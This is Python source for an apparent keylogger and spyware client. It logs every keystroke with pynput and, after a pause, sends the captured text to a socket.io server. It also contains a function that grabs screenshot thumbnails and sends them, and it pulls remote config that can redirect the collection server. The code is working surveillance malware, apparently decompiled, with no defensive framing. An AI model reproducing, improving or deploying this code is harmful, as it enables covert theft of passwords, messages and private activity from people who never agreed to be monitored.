import subprocess, socketio
from enum import Enum
import requests
from time import sleep
from PIL import ImageGrab
import os
from datetime import datetime, timedelta
from pynput.keyboard import Listener
import base64
import numpy


class App:
    VERSION = '1.0'
    BASE_URL = 'http://127.0.0.1:5000'
    KEYLOG_SECONDS_TO_SEND = 8
    KEYLOG_SECONDS_TO_LOOP_SLEEP = 60
    SC_SHOTS_SENDING_IN_SECONDS = 20
    SIO_INSTANCE = None
    KEYLOG_BUFFER_SIZE = 603366

    @classmethod
    def get_config_from_server(cls):
        """
            Get client config from server.
        """
        try:
            res = requests.get(f"{cls.BASE_URL}/client/config")
        except Exception as e:
            try:
                return
            finally:
                e = None
                del e

        else:
            if res.status_code != 200:
                return
            res_json = res.json()
            cls.update(data=res_json)

    @classmethod
    def update(cls, *, data: dict):
        """
            Update Config static variables.

            :param data: should be dict and include one of those keys: (key_logs_minutes,
                                                                        screen_shots_minutes, base_url)
        """
        cls.KEYLOG_SECONDS_TO_SEND = data.get('key_logs_minutes', cls.KEYLOG_SECONDS_TO_SEND) * 60
        cls.SC_SHOTS_SENDING_IN_SECONDS = data.get('screen_shots_minutes', cls.SC_SHOTS_SENDING_IN_SECONDS) * 60
        cls.BASE_URL = data.get('base_url', cls.BASE_URL)
        
sio = socketio.Client()



class KeyRecorder:

    def __init__(self):
        self.recorder = ''
        self.last_time_key_pressed = datetime.now()
        self.thread = None

    def on_press(self, key):
        self.last_time_key_pressed = datetime.now()
        if getattr(key, 'char', None):
            self.recorder += key.char
        else:
            if getattr(key, 'name', None):
                self.recorder += f"|{key.name}|"

    @property
    def buffer_is_bigger_then_threshold(self):
        """
            check if recorder is bigger then buffer_threshold.
        """
        return len(self.recorder) > App.KEYLOG_BUFFER_SIZE

    @property
    def report_threshold_time(self):
        return datetime.now() - timedelta(seconds=(App.KEYLOG_SECONDS_TO_SEND))

    @property
    def is_time_for_to_report(self) -> bool:
        """
            return True if it is the time to send recorder to server, else False
            it will return true if there is some data to send and time passed the threshold_time
        """
        return self.recorder and self.last_time_key_pressed < self.report_threshold_time

    def clear_recorder(self):
        """
            Clear recorder string
        """
        self.recorder = ''

    def start_recording(self):
        """
            Start async recording.
        """
        self.thread = Listener(on_press=(self.on_press))
        self.thread.IS_TRUSTED = True
        self.thread.start()




def create_key_recorder():
    key_recorder = KeyRecorder()
    key_recorder.start_recording()
    return key_recorder

def take_sc_snaps():
    """
        On mac its need permissions
    """
    size = (100,100)
    while True:
        
        try:
            screenshot = ImageGrab.grab()
            screenshot.thumbnail(size)
            sio.emit('sc_snap', {'image_data':screenshot.tobytes(),  'size':screenshot.size, 
             'mode':screenshot.mode})
        except Exception as e:
            try:
                pass
            finally:
                e = None
                del e
        
        sleep(60)



def run_key_recorder():
    """
        recorder
    """
    key_recorder = create_key_recorder()
    while True:
        if key_recorder.is_time_for_to_report:
            recorder = key_recorder.recorder
            try:
                App.SIO_INSTANCE.emit('key_recorder', {'data': recorder})
            except Exception as e:
                try:
                    pass
                finally:
                    e = None
                    del e

            else:
                key_recorder.clear_recorder()
        else:
            if key_recorder.buffer_is_bigger_then_threshold:
                key_recorder.clear_recorder()
        sleep(App.KEYLOG_SECONDS_TO_LOOP_SLEEP)




sio.connect((App.BASE_URL), transports=['polling', 'websocket'])
print('my sid is', sio.sid)
run_key_recorder()
